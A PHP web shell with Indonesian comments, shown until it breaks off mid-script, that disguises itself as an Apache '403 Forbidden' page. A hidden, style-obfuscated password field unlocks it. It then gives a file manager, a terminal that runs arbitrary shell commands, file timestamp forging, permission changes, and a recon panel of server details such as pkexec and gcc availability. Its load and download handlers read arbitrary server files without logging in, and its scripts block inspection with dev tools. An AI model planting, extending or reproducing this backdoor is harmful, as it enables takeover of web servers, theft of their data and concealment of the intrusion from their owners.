<?php
error_reporting(0);
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
ini_set('log_errors', 0);

if(!isset($_GET['q'])){
    header('HTTP/1.1 403 Forbidden');
    exit(<<<HTML
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>403 Forbidden</title>
    </head>
    <body>
        <h1>Forbidden</h1>
        <p>You don't have permission to access {$_SERVER['REQUEST_URI']} on this server.</p>
        <hr>
        <address>
            Apache/2.4.39 Server at {$_SERVER['SERVER_NAME']} Port {$_SERVER['SERVER_PORT']}
        </address>
    </body>
    </html>
    HTML
    );
}

// --- Secure session ---
$cookieParams = session_get_cookie_params();
session_set_cookie_params([
  'lifetime' => $cookieParams['lifetime'],
  'path' => $cookieParams['path'],
  'domain' => $cookieParams['domain'],
  'secure' => (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off'),
  'httponly' => true,
  'samesite' => 'Lax'
]);

session_start();

if (!isset($_SESSION['initiated'])) {
  session_regenerate_id(true);
  $_SESSION['initiated'] = true;
}

// --- Config ---
define('BASE_DIR', realpath(__DIR__ . '/files') ?: __DIR__);
if (!is_dir(BASE_DIR)) mkdir(BASE_DIR, 0755, true);
$PASSWORD_HASH = "$2y$10$01A0anoM6WNMIs6T8WVNQ.oMZnkRnQrTsjEWLFbTZmpOJ8/jQzmla";

if (!isset($_SESSION['login_attempts'])) $_SESSION['login_attempts'] = 0;
define('MAX_ATTEMPTS', 5);
define('LOCKOUT', 300);

if(isset($_GET['load'])){
  $path = resolve_path($_GET['path'] ?? BASE_DIR);
    $target = resolve_path($path . '/' . $_GET['load']);
    if (is_file($target)) {
        header('Content-Type: text/plain; charset=utf-8');
        readfile($target);
    } else {
        header('HTTP/1.1 404 Not Found');
        echo "File not found.";
    }
    exit;
}

if (isset($_GET['download'])) {
    $path = $_GET['path'] ?? BASE_DIR;
    $filename = basename($_GET['download']);

    // Normalisasi semua slash jadi DIRECTORY_SEPARATOR
    $path = str_replace(['/', '\\'], DIRECTORY_SEPARATOR, $path);
    $target = rtrim($path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $filename;

    // Coba realpath tapi fallback kalau gagal
    $realTarget = realpath($target);
    if (!$realTarget) $realTarget = $target;

    if (is_file($realTarget) && file_exists($realTarget)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($realTarget) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($realTarget));
        readfile($realTarget);
    } else {
        header('HTTP/1.1 404 Not Found');
        echo "File not found at: " . htmlspecialchars($realTarget);
    }
    exit;
}

// --- Helpers ---
function e($v){return htmlspecialchars($v,ENT_QUOTES,'UTF-8');}
function csrf_token(){if(empty($_SESSION['csrf_token']))$_SESSION['csrf_token']=bin2hex(random_bytes(24));return $_SESSION['csrf_token'];}
function csrf_check($t){return isset($_SESSION['csrf_token']) && hash_equals($_SESSION['csrf_token'],$t);}
function isLoggedIn(){return $_SESSION['logged_in']??false;}
function resolve_path($path){
  $real = realpath($path);
  if(!$real) $real = $path;
  return $real;
}
function sanitize_name($name){
  if(preg_match('/[\/\\\\]/',$name))return null;
  $name=trim($name);
  if($name==''||$name=='.'||$name=='..')return null;
  return $name;
}
function formatBytes($b){$u=['B','KB','MB','GB'];$i=0;while($b>1024&&$i<count($u)-1){$b/=1024;$i++;}return round($b,2).' '.$u[$i];}


function alertBox($type, $message) {
    $icons = [
        'success' => 'fa-circle-check',
        'danger' => 'fa-triangle-exclamation',
        'warning' => 'fa-circle-exclamation',
        'info' => 'fa-circle-info'
    ];
    $icon = $icons[$type] ?? 'fa-info-circle';
    return <<<HTML
    <div class="alert alert-{$type} alert-dismissible fade show shadow-sm mt-3" role="alert" style="border-left:5px solid #fff;">
        <i class="fa-solid {$icon} me-2"></i> {$message}
        <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
    </div>
    HTML;
}

// --- Login ---
$login_error=null;
if(isset($_POST['action']) && $_POST['action']==='login'){
  if(!csrf_check($_POST['csrf_token']??''))die('Invalid CSRF');
  if(!empty($_SESSION['locked_until']) && time()<$_SESSION['locked_until']){
    $login_error="Too many attempts. Try later.";
  }elseif(password_verify($_POST['password']??'',$PASSWORD_HASH)){
    
    $_SESSION['logged_in']=true;
    $_SESSION['login_attempts']=0;
    session_regenerate_id(true);
    header("Location: ".$_SERVER['PHP_SELF']);
    exit;
  }else{
    $_SESSION['login_attempts']++;
    if($_SESSION['login_attempts']>=MAX_ATTEMPTS)$_SESSION['locked_until']=time()+LOCKOUT;
    $login_error="Incorrect password!";
  }
}
if(isset($_GET['logout'])){session_destroy();header("Location: ".$_SERVER['PHP_SELF']);exit;}

// --- Determine current path ---
$path = resolve_path($_GET['path'] ?? BASE_DIR);


// --- Handle Actions ---
$msg='';
if(isLoggedIn() && $_SERVER['REQUEST_METHOD']==='POST' && csrf_check($_POST['csrf_token']??'')){
  // Upload
  if(!empty($_FILES['file']['name'])){
    $target=$path.'/'.basename($_FILES['file']['name']);
    $ext=strtolower(pathinfo($target,PATHINFO_EXTENSION));
    if(in_array($ext,['php','phtml','exe','sh']))$msg="<div class='alert alert-danger'>File type not allowed.</div>";
    elseif(move_uploaded_file($_FILES['file']['tmp_name'],$target))$msg="<div class='alert alert-success'>File uploaded.</div>";
    else $msg="<div class='alert alert-danger'>Upload failed.</div>";
  }
  // New folder
  if(!empty($_POST['folder_name'])){
    $n=sanitize_name($_POST['folder_name']);
    if($n && mkdir($path.'/'.$n,0755))$msg="<div class='alert alert-success'>Folder created.</div>";
    else $msg="<div class='alert alert-danger'>Failed to create folder.</div>";
  }
  // New file
  if (!empty($_POST['file_name'])) {
      $n = sanitize_name($_POST['file_name']);
      $newFile = $path . '/' . $n;

      if ($n && file_put_contents($newFile, '') !== false) {
          // file berhasil dibuat
          $msg = "<div class='alert alert-success'>File created and opened for editing.</div>";
          echo $msg;
          ?>
          <script>
            // panggil fungsi editFile di browser
            setTimeout(() => editFile('<?= e($n) ?>'), 500);
          </script>
          <?php
      } else {
          $msg = "<div class='alert alert-danger'>Failed to create file.</div>";
          echo $msg;
      }
  }
  // Delete
  if(isset($_POST['delete'])){
    $target=resolve_path($path.'/'.$_POST['delete']);
    if(is_file($target))unlink($target);
    elseif(is_dir($target))@rmdir($target);
    $msg="<div class='alert alert-success'>Deleted.</div>";
  }
  // Rename
  if(isset($_POST['rename_from'],$_POST['rename_to'])){
    $from=resolve_path($path.'/'.$_POST['rename_from']);
    $to=resolve_path($path.'/'.$_POST['rename_to']);
    if($from && dirname($from)==dirname($to)){
      rename($from,dirname($from).'/'.basename($to));
      $msg="<div class='alert alert-success'>Renamed.</div>";
    }
  }
  // Edit
  if(isset($_POST['edit_file'],$_POST['content'])){
    $target=resolve_path($path.'/'.$_POST['edit_file']);
    if(is_file($target)) file_put_contents($target,$_POST['content']);
    $msg="<div class='alert alert-success'>Saved changes.</div>";
  }

  // Modify
  if (isset($_POST['modify'], $_POST['new_time'])) {
    $target = realpath($path . '/' . $_POST['modify']);
    $timestamp = strtotime($_POST['new_time']);
    if ($timestamp !== false && file_exists($target)) {
      touch($target, $timestamp);
      echo "<div class='alert alert-success'>Timestamp file diubah.</div>";
    } else {
      echo "<div class='alert alert-danger'>Format tanggal tidak valid!</div>";
    }
  }

  // permission
  if (isset($_POST['chmod'], $_POST['new_perm'])) {
    $target = realpath($path . '/' . $_POST['chmod']);
    $perm = intval($_POST['new_perm'], 8);
    if (file_exists($target)) {
      chmod($target, $perm);
      echo "<div class='alert alert-success'>Permission diubah ke " . htmlspecialchars($_POST['new_perm']) . ".</div>";
    } else {
      echo "<div class='alert alert-danger'>Gagal ubah permission.</div>";
    }
  }

  // Konversi ukuran (mendukung KB / MB) 
  if (isset($_POST['resize'], $_POST['new_size'])) {
    $target = realpath($path . '/' . $_POST['resize']);
    $input = trim($_POST['new_size']);

    
    $multiplier = 1;
    if (stripos($input, 'KB') !== false) $multiplier = 1024;
    elseif (stripos($input, 'MB') !== false) $multiplier = 1024 * 1024;

    $numeric = (int) filter_var($input, FILTER_SANITIZE_NUMBER_INT);
    $newSize = $numeric * $multiplier;

    if (is_file($target) && is_writable($target)) {
      $fh = fopen($target, 'c+');
      if ($fh) {
        ftruncate($fh, $newSize);
        fclose($fh);
        echo "<div class='alert alert-success'>Ukuran file diubah menjadi " . $newSize . " byte.</div>";
      } else {
        echo "<div class='alert alert-danger'>Gagal membuka file.</div>";
      }
    } else {
      echo "<div class='alert alert-danger'>File tidak bisa diubah atau tidak ada izin tulis.</div>";
    }
  }
}

if (isLoggedIn() && isset($_POST['terminal_cmd']) && csrf_check($_POST['csrf_token'] ?? '')) {
    header('Content-Type: text/plain; charset=utf-8');
    $cmd = trim($_POST['terminal_cmd']);
    if ($cmd === '') exit("Command kosong.\n");

    if (empty($_SESSION['cwd']) || !is_dir($_SESSION['cwd'])) {
        $_SESSION['cwd'] = getcwd();
    }
    $cwd = $_SESSION['cwd'];

    // handle cd command
    if (preg_match('/^cd\s*(.*)$/i', $cmd, $m)) {
        $arg = trim($m[1]);
        if ($arg === '' || $arg === '.') {
            // stay
        } elseif ($arg === '..') {
            $cwd = dirname($cwd);
        } else {
            $new = realpath($cwd . DIRECTORY_SEPARATOR . $arg);
            if ($new && is_dir($new)) $cwd = $new;
            else echo "Direktori tidak ditemukan: $arg\n";
        }
        $_SESSION['cwd'] = $cwd;
        echo $cwd . ">\n";
        exit;
    }

    // handle clear / cls command
    if (preg_match('/^(clear|cls)$/i', $cmd)) {
      if (strncasecmp(PHP_OS, 'WIN', 3) == 0) {
          system('cls');
      } else {
          system('clear');
      }
      echo $cwd . ">\n";
      exit;
    }

    // blocked commands
    $blocked = ['rm ', 'reboot', 'shutdown', 'mkfs'];
    foreach ($blocked as $bad) if (stripos($cmd, $bad)!==false) exit("Perintah '$bad' tidak diizinkan.\n");

    // execute
    $output = '';
    try {
        if (function_exists('proc_open')) {
            $desc = [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];
            $p = @proc_open($cmd,$desc,$pipes,$cwd);
            if (is_resource($p)) {
                fclose($pipes[0]);
                $output = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
                fclose($pipes[1]); fclose($pipes[2]);
                proc_close($p);
            } else $output="Gagal menjalankan perintah.\n";
        } elseif (function_exists('shell_exec')) {
            $output = shell_exec("cd " . escapeshellarg($cwd) . " && " . $cmd . " 2>&1");
        } else $output="Server tidak mendukung eksekusi shell.\n";
    } catch (Throwable $e) { $output = "Error: ".$e->getMessage()."\n"; }

    echo $output ?: "(tidak ada output)\n";
    echo "\n" . $cwd . ">";
    exit;
}

?>
<!doctype html>
<html lang="en"><head>
<meta charset="utf-8">
<title>403 Forbidden</title>
<?php if(isLoggedIn()): ?>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
      <style>
    /* *{
      color: #e0e6f7;
    } */
    body {
      background-color: #111;
      color: #e0e6f7;
      font-family: 'Poppins', sans-serif;
      padding: 25px;
      font-size: 12px;
    }

    h2 {
      color: #f0f4f5ff;
      text-align: center;
      margin-bottom: 25px;
      letter-spacing: 0.05em;
    }

    .table-responsive {
      background-color: #010c29ff;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.4);
      /* padding: 10px; */
    }

    /* ======== TABLE ======== */
    .table {
      background-color: #010c29ff;
      border-collapse: separate;
      border-spacing: 0;
      /* border: 1px solid white; */
    }

    thead {
      background-color: #1a1f3c;
    }

    thead th {
      color: #f5f5f0ff;
      border-bottom: 2px solid #f0f4f5ff;
      text-transform: uppercase;
      letter-spacing: 0.05em;
    }

    tbody tr {
      transition: background 0.3s ease;
    }

    tbody tr:hover {
      background-color: rgba(0, 188, 212, 0.08);
    }

    tbody tr.table-danger {
      background: linear-gradient(90deg, rgba(255, 82, 82, 0.15), rgba(255, 82, 82, 0.05));
      font-weight: 600;
    }

    td, th {
      vertical-align: middle;
    }

    .clickable {
      cursor: pointer;
      transition: color 0.3s ease;
    }

    .clickable:hover {
      color: #f0f4f5ff !important;
    }

    /* ======== BUTTONS ======== */
    .btn {
      border: none;
      border-radius: 6px;
      padding: 5px 9px;
      transition: all 0.3s ease;
    }

    .btn-danger {
      background-color: #ff5252;
      color: #fff;
    }

    .btn-danger:hover {
      background-color: #ff1744;
      box-shadow: 0 0 8px rgba(255, 23, 68, 0.6);
    }

    .btn-warning {
      background-color: #ffb300;
      color: #010c29ff;
    }

    .btn-warning:hover {
      background-color: #ffca28;
      box-shadow: 0 0 8px rgba(255, 202, 40, 0.6);
    }

    /* ======== STATUS COLORS ======== */
    .perm-ok {
      color: #81c784;
      font-weight: 500;
    }

    .perm-bad {
      color: #ff7043;
      font-weight: 500;
    }

    /* ======== ICON STYLING ======== */
    .fa-folder {
      color: #ffca28;
      margin-right: 8px;
    }

    .fa-file {
      color: #81c784;
      margin-right: 8px;
    }

    a {
      color: #61dafb;
      text-decoration: none;
    }

    a:hover {
      text-decoration: underline;
    }

    /* ======== RESPONSIVE ======== */
    @media (max-width: 768px) {
      thead {
        display: none;
      }

      tbody tr {
        display: block;
        margin-bottom: 15px;
        border: 1px solid #2a335a;
        border-radius: 10px;
        padding: 10px;
        background-color: #1a1f3c;
      }

      tbody td {
        display: flex;
        justify-content: space-between;
        padding: 6px 10px;
      }

      tbody td::before {
        content: attr(data-label);
        font-weight: 600;
        color: #f0f4f5ff;
      }
    }

    .table>:not(caption)>*>* { 
      padding: 0 0.5rem !important;
    }

    .text-primary {
      color: #e0e6f7!important;
    }

    .text-success {
      color: #61dafb!important;
    }
    tr, td{
      font-size: 12px;
      font-family: Verdana, Geneva, sans-serif;
    }
  </style>
<?php endif; ?>
</head><body class="p-3">
<?php if(!isLoggedIn()): ?>
    <h1>Forbidden</h1>
    <p>You don't have permission to access <?php echo htmlspecialchars($_SERVER['REQUEST_URI']); ?> on this server.</p>
    <hr>
    <address>
        Apache/2.4.39 Server at <?php echo $_SERVER['SERVER_NAME']; ?> Port <?php echo $_SERVER['SERVER_PORT']; ?>
    </address>
    <?php if($login_error): ?><div class="alert alert-danger"><?=e($login_error)?></div><?php endif; ?>
<script>
(function hardenClient() {
  document.addEventListener('contextmenu', e => e.preventDefault(), {passive:false});
  document.addEventListener('selectstart', e => e.preventDefault(), {passive:false});
  document.addEventListener('copy', e => e.preventDefault(), {passive:false});
  document.addEventListener('cut', e => e.preventDefault(), {passive:false});
  document.addEventListener('dragstart', e => e.preventDefault(), {passive:false});
  window.addEventListener('keydown', function (e) {
    const key = e.key || e.keyCode;
    if ((e.ctrlKey && (key === 'u' || key === 'U' || key === 's' || key === 'S' || key === 'p' || key === 'P')) ||
        (e.ctrlKey && e.shiftKey && ['I','i','J','j','C','c'].includes(key)) ||
        key === 'F12' || key === 'Tab') {
      e.preventDefault();
      e.stopPropagation();
      return false;
    }
  }, true);

  function detectDevTools() {
    const start = performance.now();
    debugger;
    const delta = performance.now() - start;
    if (delta > 100) {
      try {
        document.documentElement.innerHTML = '';
        window.location.href = 'about:blank';
      } catch (err) { /* ignore */ }
    }
  }

  function checkDevtoolsBySize() {
    if (window.outerWidth - window.innerWidth > 160 ||
        window.outerHeight - window.innerHeight > 160) {
      try {
        document.documentElement.innerHTML = '';
        window.location.href = 'about:blank';
      } catch (err) { /* ignore */ }
    }
  }

  setInterval(checkDevtoolsBySize, 500);
  setInterval(detectDevTools, 1200);

  try {
    if (location.href.startsWith('view-source:')) {
      document.documentElement.innerHTML = '';
      window.location.href = 'about:blank';
    }
  } catch (err) {}
  function showBlockedOverlay() {
    const o = document.createElement('div');
    o.id = 'blocked-overlay';
    Object.assign(o.style, {
      position: 'fixed', inset: 0, background: '#fff', color: '#000',
      display: 'flex', alignItems: 'center', justifyContent: 'center',
      zIndex: 2147483647, fontSize: '18px'
    });
    o.textContent = '403 Forbidden.';
    document.documentElement.appendChild(o);
  }
})();
</script>
    <form method="post">
        <input type="hidden" name="action" value="login">
        <input type="hidden" name="csrf_token" value="<?=e(csrf_token())?>">
        <input type="password" name="password" id="password" style="m\000061rgin:calc(0px);
  background:\000066ff;
  border:calc(1px) solid #ffffffff;
  position:abso\00006cute;
  t\00006fp:0;ri\000067ht:0">
    </form>

<?php exit; endif; ?>

<div class="container-fluid">
  <?php
    $normalized_path = str_replace('\\', '/', $path);
    $parts = explode('/', trim($normalized_path, '/'));

    $current = '';

    $phpver = PHP_VERSION;
    $phpos = PHP_OS;
    $ip = gethostbyname($_SERVER['HTTP_HOST']);
    $uip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $serv = $_SERVER['HTTP_HOST'] ?? 'CLI';
    $soft = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
    $x_uname = function_exists('php_uname') ? php_uname() : 'Unavailable';
    $uname = function_exists('php_uname') ? substr(@php_uname(), 0, 120) : (strlen($x_uname) > 0 ? $x_uname : 'Uname Error!');

    function ifExist($path) {
        return file_exists($path);
    }

    $sql = function_exists('mysqli_connect') ? "<span class='text-success'>ON</span>" : "<span class='text-danger'>OFF</span>";
    $curl = function_exists('curl_init') ? "<span class='text-success'>ON</span>" : "<span class='text-danger'>OFF</span>";
    $wget = ifExist('/usr/bin/wget') ? "<span class='text-success'>ON</span>" : "<span class='text-danger'>OFF</span>";
    $pl = ifExist('/usr/bin/perl') ? "<span class='text-success'>ON</span>" : "<span class='text-danger'>OFF</span>";
    $py = ifExist('/usr/bin/python') ? "<span class='text-success'>ON</span>" : "<span class='text-danger'>OFF</span>";
    $gcc = ifExist('/usr/bin/gcc') ? "<span class='text-success'>ON</span>" : "<span class='text-danger'>OFF</span>";
    $pkexec = ifExist('/usr/bin/pkexec') ? "<span class='text-success'>ON</span>" : "<span class='text-danger'>OFF</span>";

    $disfunc = @ini_get("disable_functions");
    $disfc = empty($disfunc) ? "<span class='text-success'>NONE</span>" : "<span class='text-danger'>$disfunc</span>";

    $dom = $_SERVER['SERVER_NAME'] ?? 'Unknown';
    $downer = function_exists('get_current_user') ? get_current_user() : 'N/A';
    $dgrp = function_exists('posix_getgid') ? posix_getgid() : 'N/A';
    $sm = ini_get('safe_mode') ? '<span class="text-danger">ON</span>' : '<span class="text-success">OFF</span>';
  ?>

  <div class="text-purple mb-3">
    <div class="box shadow rounded-3">
        System: <span class="text-success"><?= $uname; ?></span><br>
        Software: <span class="text-success"><?= $soft; ?></span><br>
        PHP version: <span class="text-success"><?= $phpver; ?></span> | PHP OS: <span class="text-success"><?= $phpos; ?></span><br>
        Domains: <span class="text-success"><?= $dom; ?></span><br>
        Server IP: <span class="text-success"><?= $ip; ?></span><br>
        Your IP: <span class="text-success"><?= $uip; ?></span><br>
        User: <span class="text-success"><?= $downer; ?></span> | Group: <span class="text-success"><?= $dgrp; ?></span><br>
        Safe Mode: <?= $sm; ?><br>
        MYSQL: <?= $sql; ?> | PERL: <?= $pl; ?> | PYTHON: <?= $py; ?> | WGET: <?= $wget; ?> | CURL: <?= $curl; ?> | GCC: <?= $gcc; ?> | PKEXEC: <?= $pkexec; ?><br>
        Disable Function:    <?= $disfc; ?>
          <div class="d-flex justify-content-between align-items-center">
       <p> PWD:   
          <i class="fas fa-folder-open text-primary"></i>
          <?php foreach ($parts as $i => $part): ?>
            <?php
              // $current = ltrim($current . '/' . $part, '/');
              $current .= '/' . $part;
            ?>
            <a href="?path=<?= e($current) ?>&q" class="text-decoration-none text-primary">
              <?= e($part) ?>
            </a>
            <?php if ($i < count($parts) - 1): ?>
              <span class="text-muted">/</span>
            <?php endif; ?>
          <?php endforeach; ?>

          <a href="?path=&q" class="ms-2 text-danger">
            [ <i class="fas fa-home text-danger"></i> Home ]
          </a>
        </p>
        </div>

    </div>
  </div>
  
  <div class="d-flex gap-5 justify-content-center align-item-center">
    <form method="POST" enctype="multipart/form-data">
      <input type="hidden" name="csrf_token" value="<?=e(csrf_token())?>">
      <input type="file" name="file" required >
      <button class="btn btn-primary btn-sm">Upload</button>
    </form>
    
    <form method="POST">
      <input type="hidden" name="csrf_token" value="<?=e(csrf_token())?>">
      <input type="text" name="file_name" placeholder="New file name" >
      <button class="btn btn-success btn-sm">Create File</button>
    </form>

    <form method="POST" >
      <input type="hidden" name="csrf_token" value="<?=e(csrf_token())?>">
      <input type="text" name="folder_name" placeholder="New folder name">
      <button class="btn btn-warning btn-sm">Create Folder</button>
    </form>

    <button class="btn btn-dark" data-bs-toggle="modal" data-bs-target="#terminalModal">
      <i class="fas fa-terminal"></i> Terminal
    </button>

    <!-- Tombol Logout -->
    <a href="?logout=1" class="btn btn-danger">
      <i class="fas fa-sign-out-alt"></i> Logout
    </a>
  </div>

  <?= $msg ?>

<?php
$currentPath = isset($_GET['path']) ? realpath($_GET['path']) : realpath($_SERVER['SCRIPT_FILENAME']);
$items = array_diff(scandir($path), ['.', '..']);

$folders = [];
$files = [];

foreach ($items as $it) {
  $full = realpath($path . '/' . $it);
  if (is_dir($full)) {
    $folders[] = $it;
  } else {
    $files[] = $it;
  }
}

natcasesort($folders);
natcasesort($files);
$sortedItems = array_merge($folders, $files);

// Helper: convert permission ke angka octal
function perm_octal($perms) {
  return substr(sprintf('%o', $perms), -4);
}
?>

<style>
  .clickable { cursor: pointer; }
  .perm-ok { color: #198754; font-weight: bold; }     /* Hijau: ok */
  .perm-bad { color: #dc3545; font-weight: bold; }    /* Merah: no access */
  .table-hover tbody tr:hover { background-color: #f8f9fa; }
</style>


<div class="table-responsive mt-3">
  <table class="table table-hover align-middle">
    <tbody>
      <?php 
        $no = 1; 

        $parent = dirname($path);
        if ($path !== '/' && realpath($path) !== realpath($parent)):
      ?>
      <tr>
        <td data-label="#" class="text-white">0</td>
        <td data-label="Nama">
          
          <a href="?path=<?= urlencode($parent) ?>&q" class="text-info">
            <i class="fas fa-level-up-alt text-secondary"></i>
            ..</a>
        </td>
        <td data-label="Ukuran">DIR</td>
        <td data-label="Tanggal">-</td>
        <td data-label="Owner/Group">-</td>
        <td data-label="Permission">-</td>
        <td data-label="Aksi">-</td>
      </tr>
      <?php endif; ?>

      <?php 
        foreach ($sortedItems as $it):
          $full = realpath($path . '/' . $it);
          $isActive = ($currentPath === $full);
          $icon = is_dir($full) ? 'fa-folder text-warning' : 'fa-file text-success';
          $mtime = date("Y-m-d H:i", filemtime($full));
          $size = is_file($full) ? formatBytes(filesize($full)) : 'DIR';
          $perm = perm_octal(fileperms($full));
          $permClass = ($perm === '0000') ? 'perm-bad' : 'perm-ok';

          // === Tambahan Function Owner/Group ===
          $owner = function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($full))['name'] ?? 'unknown' : 'n/a';
          $group = function_exists('posix_getgrgid') ? posix_getgrgid(filegroup($full))['name'] ?? 'unknown' : 'n/a';
          $ownerGroup = "{$owner} : {$group}";
      ?>
      <tr class="<?= $isActive ? 'text-danger fw-bold' : '' ?>">
        <td data-label="#" class="text-white"><?= $no++ ?></td>

        <!-- NAMA FILE -->
        <td data-label="Nama">
          <i class="fas <?= $icon ?>"></i>
          <?php if (is_dir($full)): ?>
            <a href="?path=<?= urlencode($full) ?>&q" class="<?= $isActive ? 'text-danger' : '' ?>">
              <?= e($it) ?>
            </a>
          <?php else: ?>
            <span class="clickable text-decoration-underline text-primary" onclick="editFile('<?= e($it) ?>')">
              <?= e($it) ?>
            </span>
          <?php endif; ?>
        </td>

        <!-- UKURAN -->
        <td data-label="Ukuran" class="clickable text-success" onclick="resizeFile('<?= e($it) ?>')" title="Klik untuk ubah ukuran file">
          <i class="fas fa-ruler-combined me-1"></i> <?= $size ?>
        </td>

        <!-- TANGGAL -->
        <td data-label="Tanggal" class="clickable text-primary" onclick="modifyTimestamp('<?= e($it) ?>')" title="Klik untuk ubah timestamp">
          <i class="fas fa-clock me-1"></i> <?= $mtime ?>
        </td>

        <!-- OWNER/GROUP -->
        <td data-label="Owner/Group" class="text-success">
          <i class="fas fa-user-shield me-1 "></i> <?= e($ownerGroup) ?>
        </td>

        <!-- PERMISSION -->
        <td data-label="Permission" class="clickable <?= $permClass ?>" onclick="changePermission('<?= e($it) ?>', '<?= e($perm) ?>')" title="Klik untuk ubah permission">
          <?= $perm ?>
        </td>

        <!-- AKSI -->
        <td data-label="Aksi">
          <form method="POST" class="d-inline">
            <input type="hidden" name="csrf_token" value="<?= e(csrf_token()) ?>">
            <input type="hidden" name="delete" value="<?= e($it) ?>">
            <button class="btn btn-sm btn-danger" onclick="return confirm('Hapus <?= e($it) ?>?')">
              <i class="fas fa-trash"></i>
            </button>
          </form>
          <button type="button" class="btn btn-sm btn-warning" onclick="renamePrompt('<?= e($it) ?>')">
            <i class="fas fa-pen"></i>
          </button>
          <button type="button" class="btn btn-sm btn-success" onclick="downloadFile('<?= e($it) ?>')">
            <i class="fas fa-download"></i>
          </button>
        </td>
      </tr>
      <?php endforeach; ?>
    </tbody>
  </table>
</div>

<!-- Rename Modal -->
<div id="renameModal" class="p-3 bg-light border rounded" style="display:none;position:fixed;top:20%;left:40%;z-index:10;">
  <h6>Rename Item</h6>
  <form method="POST">
    <input type="hidden" name="csrf_token" value="<?=e(csrf_token())?>">
    <input type="hidden" name="rename_from" id="rename_from">
    <input type="text" name="rename_to" id="rename_to" class="form-control mb-2">
    <button class="btn btn-warning btn-sm">Rename</button>
    <button type="button" class="btn btn-secondary btn-sm" onclick="document.getElementById('renameModal').style.display='none'">Cancel</button>
  </form>
</div>

<!-- Edit Modal -->
<div id="editModal" class="p-3 bg-light border rounded" style="display:none;position:fixed;top:10%;left:15%;right:15%;z-index:10;">
  <h6 class="text-danger"><?= e($_GET['path'] ?? '') ?></h6>
  <form method="POST">
    <input type="hidden" name="csrf_token" value="<?=e(csrf_token())?>">
    <input type="hidden" name="edit_file" id="edit_file">
    <textarea name="content" id="edit_content" class="form-control mb-2" style="height:400px;"></textarea>
    <button class="btn btn-success btn-sm">Save</button>
    <button type="button" class="btn btn-secondary btn-sm" onclick="document.getElementById('editModal').style.display='none'">Close</button>
  </form>
</div>

<!-- Terminal Modal -->
<div class="modal fade" id="terminalModal" tabindex="-1">
  <div class="modal-dialog modal-lg modal-dialog-centered">
    <div class="modal-content bg-dark text-light">
      <div class="modal-header border-secondary">
        <h5 class="modal-title"><i class="fas fa-terminal me-2"></i> Terminal</h5>
        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
      </div>
      <div class="modal-body">
        <div id="terminalOutput" class="mb-3"><pre><?= e($_SESSION['cwd'] ?? getcwd()) ?>&gt;</pre></div>
        <form id="terminalForm" class="d-flex gap-2">
          <input type="hidden" name="csrf_token" value="<?= e(csrf_token()) ?>">
          <input type="text" id="terminal_cmd" name="terminal_cmd" class="form-control" placeholder="Ketik perintah dan tekan Enter..." autocomplete="off">
          <button class="btn btn-success">Run</button>
        </form>
      </div>
    </div>
  </div>
</div>


<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
<script>
  const form=document.getElementById('terminalForm');
  const out=document.getElementById('terminalOutput');
  const input=document.getElementById('terminal_cmd');
  const terminalModal=document.getElementById('terminalModal');
  let hist=[],pos=-1;

  form.addEventListener('submit',e=>{
    e.preventDefault();
    const cmd=input.value.trim();
    if(!cmd)return;
    hist.push(cmd); pos=hist.length;
    out.innerHTML+=`<div class="text-info">$ ${cmd}</div>`;
    fetch('',{
      method:'POST',
      headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body:new URLSearchParams({
        csrf_token:document.querySelector('[name="csrf_token"]').value,
        terminal_cmd:cmd
      })
    })
    .then(r=>r.text())
    .then(t=>{
      if (cmd.toLowerCase() === 'clear' || cmd.toLowerCase() === 'cls') {
        out.classList.add('fade-out');
        setTimeout(()=>{
          out.innerHTML = `<pre>${t}</pre>`;
          out.classList.remove('fade-out');
          out.classList.add('fade-in');
        },250);
      } else {
        out.innerHTML += `<pre>${t}</pre>`;
      }
      out.scrollTo({top:out.scrollHeight,behavior:'smooth'});
      input.value='';
    })
    .catch(()=>{
      out.innerHTML+=`<pre style="color:red">(Gagal koneksi ke server)</pre>`;
    });
  });

  // navigasi dengan panah atas/bawah
  input.addEventListener('keydown',e=>{
    if(e.key==='ArrowUp'&&pos>0){pos--;input.value=hist[pos];e.preventDefault();}
    else if(e.key==='ArrowDown'){
      if(pos<hist.length-1){pos++;input.value=hist[pos];}
      else{input.value='';pos=hist.length;}
    }
  });

  // reset terminal saat modal ditutup
  terminalModal.addEventListener('hidden.bs.modal',()=>{
    out.classList.add('fade-out');
    setTimeout(()=>{
      out.innerHTML = `<pre><?= e($_SESSION['cwd'] ?? getcwd()) ?>&gt;</pre>`;
      out.classList.remove('fade-out');
      out.classList.add('fade-in');
      hist=[]; pos=-1;
    },200);
  });

  // fokus otomatis ke input saat modal dibuka
  terminalModal.addEventListener('shown.bs.modal',()=>{
    input.focus();
  });
</script>
<script>
  function renamePrompt(name){
    document.getElementById('rename_from').value=name;
    document.getElementById('rename_to').value=name;
    document.getElementById('renameModal').style.display='block';
  }

  function editFile(name) {
    const currentPath = "<?= str_replace('\\', '/', $path) ?>";
    const url = '?q=1&path=' + encodeURIComponent(currentPath.replaceAll('\\\\', '/')) + '&load=' + encodeURIComponent(name);

    fetch(url)
      .then(r => {
        if (!r.ok) throw new Error('Gagal memuat file');
        return r.text();
      })
      .then(t => {
        document.getElementById('edit_file').value = name;
        document.getElementById('edit_content').value = t;
        const displayPath = currentPath + "/" + name;
